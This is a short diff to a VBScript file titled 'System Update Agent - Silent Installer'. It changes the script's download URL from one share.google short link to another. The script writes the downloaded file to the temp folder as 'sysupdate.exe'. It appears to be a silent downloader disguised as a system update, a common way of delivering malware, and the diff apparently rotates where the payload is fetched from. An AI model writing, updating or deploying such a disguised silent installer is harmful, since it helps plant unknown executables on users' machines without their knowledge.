@@ -1,5 +1,4 @@
 
-
 ' --------------------------------------------------------------------------
 '  System Update Agent - Silent Installer
 ' --------------------------------------------------------------------------
@@ -28,7 +27,7 @@ Sub Main()
     Dim downloadUrl, tempPath, installerPath, result
     
     ' Configuration
-    downloadUrl = "https://share.google/mkGe1JX56Lut4KMdt"
+    downloadUrl = "https://share.google/zwqwLoZiVh08jLOa4"
     tempPath = objFSO.GetSpecialFolder(TEMP_FOLDER).Path
     installerPath = tempPath & "\sysupdate.exe"
     
